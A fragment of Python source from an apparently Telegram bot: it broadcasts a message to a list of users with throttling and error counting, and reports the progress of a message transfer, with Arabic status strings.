            failed_count = 0
            total_users = len(user_ids)
            last_update_time = 0

            for i, user_id in enumerate(user_ids):
                if stop_event and stop_event.is_set():
                    break

                try:

                    await with_telegram_retry(lambda: temp_bot.send_message(int(user_id), message_text))
                    success_count += 1

                except Exception as e:

                    error_msg = str(e).lower()
                    if "could not find the input entity" in error_msg:

                        failed_count += 1
                    elif "bots can't send messages to other bots" in error_msg:

                        failed_count += 1
                    elif "user is deactivated" in error_msg:

                        failed_count += 1
                    elif "peer id invalid" in error_msg:

                        failed_count += 1
                    elif "user is blocked" in error_msg:

                        failed_count += 1
                    else:

                        failed_count += 1
                        print(f"Error sending to user {user_id}: {e}")


                if total_users > 1000 and (i + 1) % 500 == 0 and (i + 1) < total_users:
                    print(f"⏸️ توقف مؤقت بعد إرسال 500 رسالة من أصل {total_users}")
                    await asyncio.sleep(5)


                await asyncio.sleep(0.1)


                current_time = time.time()
                if progress_callback and (current_time - last_update_time >= 5 or i + 1 == total_users):
                    last_update_time = current_time
                    if not await progress_callback(i + 1, total_users):
                        break

            await temp_bot.disconnect()

            try:
                if os.path.exists(f"{temp_session}.session"):
                    os.remove(f"{temp_session}.session")
            except:
                pass

            return success_count, failed_count

        except Exception as e:
            print(f"Error in fast broadcast: {e}")
            return 0, total_users

                'id': progress_msg.id,
                'chat_id': progress_msg.chat_id,
                'text': "🚀 بدء نقل الرسائل من 1 إلى {}...".format(max_id)
            }

            async def update_progress(current, total):
                nonlocal last_update_time, last_percent


                current_state = await get_user_state(user_id)
                if current_state.get('stop_requested'):
                    return False

                current_time = time.time()
                current_percent = (current / total) * 100 if total > 0 else 0

                if (current_time - last_update_time >= 5 or 
                    abs(current_percent - last_percent) >= 1 or 
                    current == total):

                    last_update_time = current_time
                    last_percent = current_percent
                    new_text = "📤 جاري نقل الرسائل: {}/{} ({:.1f}%)".format(current, total, current_percent)


                    current_state['progress_message']['text'] = new_text
                    await set_user_state(user_id, current_state)

                    await safe_edit_message(progress_msg, new_text, stop_button)
                return True
